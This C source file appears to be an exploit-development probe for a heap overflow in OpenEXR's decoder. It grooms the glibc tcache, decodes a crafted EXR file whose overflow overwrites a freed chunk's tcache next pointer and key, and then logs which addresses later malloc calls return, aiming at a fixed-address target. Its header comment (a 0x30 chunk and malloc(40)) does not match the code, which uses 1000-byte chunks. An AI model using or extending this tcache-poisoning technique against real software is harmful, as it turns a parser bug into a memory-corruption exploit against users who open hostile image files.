/* W-new tcache steering probe.
 *
 * Prime tcache so a freed 0x30 chunk sits immediately after the 256-byte
 * uncompressed_buffer.  W184's mixed-full PoC writes 128 fully file-chosen
 * bytes at dst+256..+384, which covers that chunk's header and its first
 * 16 user bytes (glibc tcache next/key).  Report what a later malloc(40)
 * returns.  Plain glibc, no guard allocator, no wire, no command, no marker.
 */
#include <openexr.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

static char benign_anchor[64]; /* fixed-address target control in a -no-pie build */

int
main (int argc, char** argv)
{
    exr_context_t             ctxt = NULL;
    exr_context_initializer_t cxt_init = EXR_DEFAULT_CONTEXT_INITIALIZER;
    exr_chunk_info_t          cinfo = { 0 };
    exr_decode_pipeline_t     decode = EXR_DECODE_PIPELINE_INITIALIZER;
    exr_result_t              rv;
    float**                   deep_ptrs = NULL;
    float*                    deep_data = NULL;
    const int                 W = 64, NSAMP = 1024;
    void*                     A = NULL;
    void*                     B = NULL;
    uintptr_t                 stored_next, key;
    void*                     m1;
    void*                     m2;

    setvbuf (stdout, NULL, _IONBF, 0);
    if (argc < 2) {
        fprintf (stderr, "usage: %s file.exr [prepass]\n", argv[0]);
        return 2;
    }

    rv = exr_start_read (&ctxt, argv[1], &cxt_init);
    printf ("START rv=%d\n", (int) rv);
    if (rv != EXR_ERR_SUCCESS) return 3;
    rv = exr_read_scanline_chunk_info (ctxt, 0, 0, &cinfo);
    if (rv != EXR_ERR_SUCCESS) return 4;
    rv = exr_decoding_initialize (ctxt, 0, &cinfo, &decode);
    if (rv != EXR_ERR_SUCCESS) return 5;

    deep_data = (float*) calloc ((size_t) W * NSAMP, sizeof (float));
    deep_ptrs = (float**) calloc ((size_t) W, sizeof (float*));
    if (!deep_data || !deep_ptrs) return 6;
    for (int i = 0; i < W; ++i) deep_ptrs[i] = deep_data + (size_t) i * NSAMP;
    for (int c = 0; c < decode.channel_count; ++c) {
        decode.channels[c].decode_to_ptr = (uint8_t*) deep_ptrs;
        decode.channels[c].user_pixel_stride = sizeof (float*);
        decode.channels[c].user_line_stride = W * sizeof (float*);
    }
    rv = exr_decoding_choose_default_routines (ctxt, 0, &decode);
    if (rv != EXR_ERR_SUCCESS) return 7;
    /* update_pack_unpack_ptrs allocates a 256-byte sample-count table
     * before the 256-byte unpacked_buffer, both from tcache[0x110].
     * A is the destination; B (0x3f0) sits immediately after A; C is the
     * 0x110 chunk consumed first.  X is freed before B so B is not last
     * in tcache[0x3f0]; D0..D4 are five later chunks of that class.  A
     * later malloc(1000) must then follow B's file-chosen next pointer. */
    void* C = NULL;
    void* D[5];
    void* X = malloc (1000);
    A = malloc (256);
    B = malloc (1000);
    C = malloc (256);
    for (int i = 0; i < 5; ++i) D[i] = malloc (1000);
    if (!A || !B || !C || !X) return 8;
    memset (A, 0x41, 256);
    memset (B, 0x42, 1000);
    free (X);
    free (A);
    free (B);
    free (C);
    for (int i = 0; i < 5; ++i) free (D[i]);
    printf ("PRIME A=%p B=%p C=%p X=%p delta=%ld anchor=%p\n",
            A, B, C, X, (char*) B - (char*) A, (void*) benign_anchor);

    rv = exr_decoding_run (ctxt, 0, &decode);
    printf ("DECODE rv=%d %s buf=%p delta=%ld\n", (int) rv,
            exr_get_error_code_as_string (rv), (void*) decode.unpacked_buffer,
            (char*) decode.unpacked_buffer - (char*) A);

    stored_next = *(uintptr_t*) B;
    key = *(uintptr_t*) ((char*) B + 8);
    printf ("TCACHE stored_next=0x%016lx key=0x%016lx\n",
            (unsigned long) stored_next, (unsigned long) key);

    for (int i = 1; i <= 10; ++i) {
        void* m = malloc (1000);
        printf ("M%d=%p\n", i, m);
    }

    /* Skip decode cleanup: an intentionally poisoned tcache can make free()
     * abort, and the observations above are already printed unbuffered. */
    _exit (0);
}
